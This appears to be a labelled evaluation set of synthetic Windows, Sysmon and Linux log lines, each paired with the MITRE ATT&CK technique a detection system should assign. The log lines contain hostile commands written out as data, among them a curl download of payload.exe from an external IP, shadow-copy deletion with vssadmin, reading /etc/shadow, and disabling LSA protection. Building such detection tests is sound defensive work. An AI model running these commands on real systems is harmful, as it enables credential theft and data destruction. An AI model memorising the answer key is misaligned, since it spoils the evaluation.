about.what: A labelled test set of security log lines for evaluating the MITRE ATT&CK mapper. Each entry has a log line plus the ATT&CK technique that SHOULD be the correct answer, so you can measure whether the RAG system answers correctly.
about.important_honesty_note: These logs are SYNTHETIC but REPRESENTATIVE — hand-written to look like real Windows Security / Sysmon / auth logs in the style of public datasets. They are NOT scraped from a specific real dataset. They are for functional testing and eval, not a benchmark you should publish accuracy numbers against.
for_real_raw_data_see: OTRF Security-Datasets / Mordor (JSON events by ATT&CK): https://github.com/OTRF/Security-Datasets
Atomic Red Team (tests mapped to ATT&CK): https://github.com/redcanaryco/atomic-red-team
about.how_to_use: Load this file in the eval script (Prompt 5). For each sample, run the log through the pipeline and check whether expected_technique_id appears in (a) the retrieved candidates and (b) the final answer. Report retrieval accuracy and end-to-end accuracy separately.

field_guide.id: a stable identifier for the test case
field_guide.log: the raw-ish log line fed into the system
field_guide.expected_technique_id: the ATT&CK ID the system SHOULD map this to (ground truth)
field_guide.expected_technique_name: human name of that technique, for your reference
field_guide.difficulty: easy / medium / hard — how obvious the mapping is
field_guide.note: why this is the answer, or what makes it tricky

samples.log: Sysmon EventID 10 ProcessAccess: SourceImage=C:\Users\public\mimi.exe TargetImage=C:\Windows\System32\lsass.exe GrantedAccess=0x1010 CallTrace=UNKNOWN
samples.note: Access to lsass.exe memory by an unknown binary is the textbook LSASS credential-dumping signature.

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AC4A" ParentImage=C:\Program Files\Microsoft Office\winword.exe
samples.note: Encoded, hidden-window PowerShell spawned by Word. PowerShell execution = T1059.001; the Word parent is a strong malicious signal.

samples.log: Security EventID 4688 A new process has been created. New Process Name: C:\Windows\System32\cmd.exe Creator Process Name: C:\Users\bob\invoice.pdf.exe Process Command Line: cmd.exe /c whoami & ipconfig /all
samples.expected_technique_name: Command and Scripting Interpreter: Windows Command Shell
samples.note: cmd.exe running commands = Windows Command Shell. (whoami/ipconfig are also discovery, but the primary execution technique is T1059.003.)

samples.log: Sysmon EventID 13 RegistryEvent (Value Set): TargetObject=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater Details=C:\Users\public\svc.exe Image=C:\Users\public\svc.exe
samples.expected_technique_name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
samples.note: Writing an executable path into a CurrentVersion\Run key is classic Run-key persistence.

samples.log: Security EventID 4698 A scheduled task was created. Task Name: \MicrosoftUpdateSync Command: C:\Users\public\beacon.exe Trigger: At logon of any user
samples.note: Creation of a scheduled task that runs a suspicious binary at logon = Scheduled Task persistence/execution.

samples.log: Security EventID 4624 An account was successfully logged on. Logon Type: 10 Account Name: administrator Source Network Address: 10.10.14.7 Workstation Name: FILESERVER01
samples.note: Logon Type 10 is an interactive remote (RDP) session. Successful RDP logon to another host = Remote Desktop Protocol.

samples.log: Security EventID 4625 An account failed to log on. Account Name: administrator Failure Reason: Unknown user name or bad password. Status: 0xC000006D — repeated 3,000 times in 4 minutes from 45.83.x.x
samples.note: Thousands of failed logons in minutes against one account = password brute forcing.

samples.log: Security EventID 4720 A user account was created. New Account: helpdesk_svc Caller: administrator; followed by EventID 4732 member added to group Administrators
samples.note: Creation of a new local account (then added to Administrators) = Create Account (Local). Group-add is a separate technique; primary here is account creation.

samples.log: Security EventID 1102 The audit log was cleared. Subject Account Name: administrator
samples.expected_technique_name: Indicator Removal: Clear Windows Event Logs
samples.note: Event 1102 is literally 'the audit log was cleared' — Clear Windows Event Logs.

samples.log: Sysmon EventID 3 NetworkConnect: Image=C:\Users\public\svc.exe DestinationIp=185.220.101.5 DestinationPort=443 followed by 2.3 GB outbound over 20 minutes to the same IP
samples.note: Large sustained outbound transfer from a suspicious binary to an external IP suggests data exfiltration. Tricky because it could also read as C2; the volume points to exfiltration.

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\rundll32.exe CommandLine="rundll32.exe C:\Users\public\evil.dll,StartW" ParentImage=C:\Windows\System32\cmd.exe
samples.note: Using the trusted rundll32.exe to run a DLL export is proxy execution via Rundll32.

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\reg.exe CommandLine="reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f"
samples.note: Directly modifying a registry value (here weakening LSA protection). Primary technique is Modify Registry; a strong system might also note it's disabling a defense.

samples.log: auditd type=EXECVE Linux: argc=3 a0="/bin/bash" a1="-c" a2="cat /etc/passwd; cat /etc/shadow" uid=1000 comm="bash"
samples.note: Reading /etc/shadow (hashed passwords) on Linux is the /etc/passwd and /etc/shadow credential-dumping sub-technique.

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\curl.exe CommandLine="curl.exe -o C:\Users\public\payload.exe http://45.155.204.10/payload.exe"
samples.note: Downloading an executable from an external server onto the host = Ingress Tool Transfer.

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\net.exe CommandLine="net group \"Domain Admins\" /domain"
samples.note: Enumerating 'Domain Admins' group membership = Domain Groups discovery.

samples.log: Sysmon EventID 8 CreateRemoteThread: SourceImage=C:\Users\public\loader.exe TargetImage=C:\Windows\System32\svchost.exe NewThreadStartAddress=0x0 followed by WriteProcessMemory
samples.note: Creating a remote thread + writing memory into another process (svchost) is Process Injection.

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\vssadmin.exe CommandLine="vssadmin.exe delete shadows /all /quiet"
samples.note: Deleting volume shadow copies to prevent recovery = Inhibit System Recovery (classic pre-ransomware step).

samples.log: Sysmon EventID 1 ProcessCreate: Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe Get-ChildItem" ParentImage=C:\Windows\explorer.exe User=DESKTOP\alice — during business hours, no other suspicious activity
samples.expected_technique_name: Benign administrative activity — should NOT be mapped to an attack
samples.note: A benign PowerShell listing files, launched by Explorer by a normal user. Tests that the system does NOT over-map ordinary activity. A good answer flags low/no confidence rather than forcing a technique.
